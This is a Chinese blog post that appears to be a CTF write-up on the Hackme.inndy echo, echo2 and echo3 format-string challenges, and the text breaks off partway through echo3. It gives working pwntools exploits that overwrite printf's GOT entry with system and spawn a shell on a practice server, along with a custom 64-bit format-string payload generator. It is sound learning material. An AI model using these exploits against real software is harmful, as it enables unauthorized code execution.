<!DOCTYPE html><html class="theme-next gemini use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"><link rel="stylesheet" href="/css/main.css?v=7.1.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0"><link rel="icon" type="image/png" sizes="32x32" href="/images/xintiao_32.png?v=7.1.0"><link rel="icon" type="image/png" sizes="16x16" href="/images/xintiao_16.png?v=7.1.0"><link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222"><link rel="manifest" href="/images/manifest.json"><meta name="msapplication-config" content="/images/browserconfig.xml"><script id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Gemini",version:"7.1.0",sidebar:{position:"left",display:"post",offset:12,onmobile:!1,dimmer:!1},back2top:!0,back2top_sidebar:!0,fancybox:!1,fastclick:!1,lazyload:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><meta property="og:type" content="article"><meta property="og:title" content="[Hackme.inndy]echo&#x2F;echo2&#x2F;echo3"><meta property="og:url" content="http://liul14n.top/2020/03/16/Hackme-inndy-echo-echo2-echo3/index.html"><meta property="og:site_name" content="LiuLian"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/72707136_p0.jpg"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200317004722413.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010304.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010441.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010524.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010913.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200318190827725.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318191540.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318192148.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318192806.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319013451.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319020512.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_77941145_20191125_132523.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319175220.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/74006495_p0.jpg"><meta property="og:updated_time" content="2022-01-07T06:37:49.371Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="[Hackme.inndy]echo&#x2F;echo2&#x2F;echo3"><meta name="twitter:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/72707136_p0.jpg"><link rel="canonical" href="http://liul14n.top/2020/03/16/Hackme-inndy-echo-echo2-echo3/"><script id="page.configurations">CONFIG.page={sidebar:""}</script><title>[Hackme.inndy]echo/echo2/echo3 | LiuLian</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-title,.use-motion .comments,.use-motion .menu-item,.use-motion .motion-element,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .logo,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">LiuLian</span> <span class="logo-line-after"><i></i></span></a></div></div><div class="site-nav-toggle"><button aria-label="切换导航栏"><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档<span class="badge">60</span></a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://liul14n.top/2020/03/16/Hackme-inndy-echo-echo2-echo3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="LiuLian"><meta itemprop="description" content="Salute The Time"><meta itemprop="image" content="/images/touxiang.jpeg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="LiuLian"></span><header class="post-header"><h2 class="post-title" itemprop="name headline">[Hackme.inndy]echo/echo2/echo3</h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-03-16 19:11:44" itemprop="dateCreated datePublished" datetime="2020-03-16T19:11:44+08:00">2020-03-16</time> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-01-07 14:37:49" itemprop="dateModified" datetime="2022-01-07T14:37:49+08:00">2022-01-07</time> </span><span class="post-category"><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-eye"></i> 阅读次数： <span class="busuanzi-value" id="busuanzi_value_page_pv"></span></span><div class="post-symbolscount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i> </span><span class="post-meta-item-text">本文字数：</span> <span title="本文字数">71k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span title="阅读时长">1:01</span></div></div></header><div class="post-body" itemprop="articleBody"><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/72707136_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>通过三道格式化字符串的题目学习巩固格式化字符串漏洞的利用</strong></p><p>这是[Hackme.inndy]的题目，在BUUOJ上也能找得到。</p><p>做这三道题目用了不少时间，仔细想想，还是因为最开始学格式化字符串的时候没学扎实，漏了挺多细节，导致题目打不通。</p><p>不过虽然用了不少时间，但是收获还是非常多的。</p><h1 id="0x01-echo"><a href="#0x01-echo" class="headerlink" title="0x01 echo"></a>0x01 echo</h1><p>这是三道题目里面最简单的一道。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200317004722413.png" alt></p><p>很明显存在格式化字符串漏洞。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>由于是32位程序，可以直接利用pwntools的<code>fmtstr_payload</code>模块构造payload，覆盖<code>printf_got</code>为<code>system_plt</code>，然后<code>sendline(&#39;/bin/sh&#39;)</code>即可</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./echo')</span></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29729</span>)</span><br><span class="line">elf = ELF(<span class="string">'./echo'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;printf:system&#125;)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x02-echo2"><a href="#0x02-echo2" class="headerlink" title="0x02 echo2"></a>0x02 echo2</h1><p>这道题相比第一道要有些难度了。</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>可以看到程序开启了PIE且是64位程序。</p><p>所以要先泄露程序真正的加载地址，然后再覆盖<code>printf_got</code>为<code>system_plt</code>。</p><p>不过这里不能再用pwntools的<code>fmtstr_payload</code>模块了,因为64位程序的地址容易出现’\x00’造成截断。</p><h2 id="Do-it！"><a href="#Do-it！" class="headerlink" title="Do it！"></a>Do it！</h2><h3 id="泄露程序加载地址"><a href="#泄露程序加载地址" class="headerlink" title="泄露程序加载地址"></a>泄露程序加载地址</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010304.png" alt></p><p>可以在IDA中看到<code>call printf</code>的地址为0x984，这是相对偏移，gdb下断在此处然后查看栈的情况如下:</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010441.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010524.png" alt></p><p>能够看到<code>0x7fffffffde48</code>存放着<code>main+74</code>，<code>0x7fffffffde58</code>存放着<code>__libc_start_main+240</code></p><p>调试可以知道这两处分别对应<code>%41$p</code>、<code>%43$p</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010913.png" alt></p><p>通过pie命令可以知道程序加载基址为<code>0x555555554000</code>，这和我们的main+74正好相差0xa03，由此可以泄露出程序加载基址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'%41$p---'</span> + <span class="string">'%43$p...'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">elfbase  = int(c.recvuntil(<span class="string">'---'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0xa03</span></span><br><span class="line">l_s_m_addr = int(c.recvuntil(<span class="string">'...'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',l_s_m_addr)</span></span><br><span class="line"><span class="comment">#libcbase = l_s_m_addr - libc.dump('__libc_start_main')</span></span><br><span class="line"></span><br><span class="line">system = elf.plt[<span class="string">'system'</span>] + elfbase</span><br><span class="line"><span class="comment">#system = libcbase + libc.dump('system')</span></span><br><span class="line">printf = elf.got[<span class="string">'printf'</span>] + elfbase</span><br><span class="line">success(<span class="string">'printf = '</span> + hex(printf))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br></pre></td></tr></table></figure><p><strong>实际上只需要泄露出elfbase即可，但是大多数wp都同时泄露了__libc_start_main进而泄露libcbase，然后通过libcbase+libc.dump(‘system’)来得到system地址</strong></p><p>根据注释应该能看出来这是两种方法，通过测试这两种方法都是可以打通的</p><h3 id="构造payload-amp-getshell"><a href="#构造payload-amp-getshell" class="headerlink" title="构造payload&amp;getshell"></a>构造payload&amp;getshell</h3><p>这算是第一次接触64位的格式化字符串漏洞吧，之前打32位的时候一直用的<code>fmtstr_payload</code>,现在没法用它，感觉少了些什么。</p><p>第一次打的时候是手动构造的payload，但是懒惰成为了第一生产力，我在网上搜了两个64位的<code>fmtstr_payload</code>，其中一个完全不能用，还有一个这道题能用，但是别的题好像就不行了。放一下链接</p><p><a href="https://www.aloxaf.com/2018/07/hackme_inndy/#echo2" target="_blank" rel="noopener">这道题可用</a></p><p><a href="https://xz.aliyun.com/t/7110#toc-18" target="_blank" rel="noopener">完全打不通</a></p><p><strong>无奈只能仿照着这俩自己写了一个，虽然也是有一定的局限性，还可能有bug，但我测了好几组样例，都正常，当然还有一些地方可以优化，但是太懒了，就懒得鼓捣了。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmtstr_payload64</span><span class="params">(offset, src, data,type = <span class="string">'byte'</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    生成 64 位格式化字符串payload</span></span><br><span class="line"><span class="string">    offset: 偏移</span></span><br><span class="line"><span class="string">    src: 源地址</span></span><br><span class="line"><span class="string">    data: 欲写入内容</span></span><br><span class="line"><span class="string">    type: 目前只支持int、longlong、byte类型，默认为byte</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    data = hex(data).replace(<span class="string">'L'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> type == <span class="string">'int'</span>:</span><br><span class="line">        dataLen = <span class="number">8</span></span><br><span class="line">    <span class="keyword">elif</span> type == <span class="string">'longlong'</span>:</span><br><span class="line">        dataLen = <span class="number">16</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dataLen = len(data[<span class="number">2</span>:]) <span class="keyword">if</span> len(data[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">0</span> <span class="keyword">else</span> len(data[<span class="number">2</span>:])+<span class="number">1</span></span><br><span class="line">    x = (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> <span class="keyword">if</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>%<span class="number">8</span> == <span class="number">0</span> <span class="keyword">else</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    data = data[<span class="number">2</span>:].rjust(<span class="number">16</span>,<span class="string">'0'</span>)</span><br><span class="line">    curNum = <span class="number">0</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        num = data[<span class="number">-2</span>-(index*<span class="number">2</span>):] <span class="keyword">if</span> index == <span class="number">0</span> <span class="keyword">else</span> data[<span class="number">-2</span>-(index*<span class="number">2</span>):<span class="number">0</span>-(index*<span class="number">2</span>)]</span><br><span class="line">        num = int(num,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">            payload += <span class="string">'%'</span> + str(num) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">            curNum = num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> num &lt;= (curNum&amp;<span class="number">0xff</span>):</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> )</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    payload = payload.ljust(<span class="number">8</span>*x,<span class="string">'a'</span>)</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        payload += p64(src + index)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>然后覆盖就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload64(offset,printf,system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmtstr_payload64</span><span class="params">(offset, src, data,type = <span class="string">'byte'</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    生成 64 位格式化字符串payload</span></span><br><span class="line"><span class="string">    offset: 偏移</span></span><br><span class="line"><span class="string">    src: 源地址</span></span><br><span class="line"><span class="string">    data: 欲写入内容</span></span><br><span class="line"><span class="string">    type: 目前只支持int、longlong、byte类型，默认为byte</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    data = hex(data).replace(<span class="string">'L'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> type == <span class="string">'int'</span>:</span><br><span class="line">        dataLen = <span class="number">8</span></span><br><span class="line">    <span class="keyword">elif</span> type == <span class="string">'longlong'</span>:</span><br><span class="line">        dataLen = <span class="number">16</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dataLen = len(data[<span class="number">2</span>:]) <span class="keyword">if</span> len(data[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">0</span> <span class="keyword">else</span> len(data[<span class="number">2</span>:])+<span class="number">1</span></span><br><span class="line">    x = (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> <span class="keyword">if</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>%<span class="number">8</span> == <span class="number">0</span> <span class="keyword">else</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    data = data[<span class="number">2</span>:].rjust(<span class="number">16</span>,<span class="string">'0'</span>)</span><br><span class="line">    curNum = <span class="number">0</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        num = data[<span class="number">-2</span>-(index*<span class="number">2</span>):] <span class="keyword">if</span> index == <span class="number">0</span> <span class="keyword">else</span> data[<span class="number">-2</span>-(index*<span class="number">2</span>):<span class="number">0</span>-(index*<span class="number">2</span>)]</span><br><span class="line">        num = int(num,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">            payload += <span class="string">'%'</span> + str(num) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">            curNum = num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> num &lt;= (curNum&amp;<span class="number">0xff</span>):</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> )</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    payload = payload.ljust(<span class="number">8</span>*x,<span class="string">'a'</span>)</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        payload += p64(src + index)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./echo2')</span></span><br><span class="line">elf = ELF(<span class="string">'./echo2'</span>)</span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28145</span>)</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%41$p---'</span> + <span class="string">'%43$p...'</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line">elfbase  = int(c.recvuntil(<span class="string">'---'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0xa03</span></span><br><span class="line">l_s_m_addr = int(c.recvuntil(<span class="string">'...'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',l_s_m_addr)</span></span><br><span class="line"><span class="comment">#libcbase = l_s_m_addr - libc.dump('__libc_start_main')</span></span><br><span class="line"></span><br><span class="line">system = elf.plt[<span class="string">'system'</span>] + elfbase</span><br><span class="line"><span class="comment">#system = libcbase + libc.dump('system')</span></span><br><span class="line">printf = elf.got[<span class="string">'printf'</span>] + elfbase</span><br><span class="line">success(<span class="string">'printf = '</span> + hex(printf))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload64(offset,printf,system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-echo3"><a href="#0x03-echo3" class="headerlink" title="0x03 echo3"></a>0x03 echo3</h1><p>这道题的远程快给我打吐了。</p><p>应该是BUU上面环境没配置好，远程怎么都打不通，各种exp都试了也不行，但是远程打题目原平台hackme.inndy却能打通。。。</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>第一次接触这类<code>Fmt_bss</code>类型的格式化字符串题目。和前两道题目相比，这道题目</p><ol><li>buf在bss段</li><li>main函数有一处调用了alloca，alloca的参数是个随机值，然后<code>sub esp, eax</code>使得esp被减一个随机的值，导致栈地址比较随机。</li></ol><p>这两点我都是第一次接触，做起来用了挺长时间。</p><p>查阅了大量WP以后，得知这类型(Fmt_bss)的题目有一个套路，就是<code>找跳板</code>，然后覆盖<code>printf_got</code>为<code>system</code>。再传入<code>/bin/sh</code></p><h3 id="找跳板的原因？"><a href="#找跳板的原因？" class="headerlink" title="找跳板的原因？"></a><strong>找跳板的原因？</strong></h3><p><strong>找跳板的原因？</strong>：对于<code>%ac$xn</code>a为个数，x是偏移，如果此处地址里面存放的依旧是个指针(地址)，那么会向里面存放的指针所指向的地方写入数据。</p><p>即 A-&gt;B-&gt;C,A和B都是地址，则最后数据会写到C处。</p><h2 id="Do-it"><a href="#Do-it" class="headerlink" title="Do it!"></a>Do it!</h2><h3 id="写在前面"><a href="#写在前面" class="headerlink" 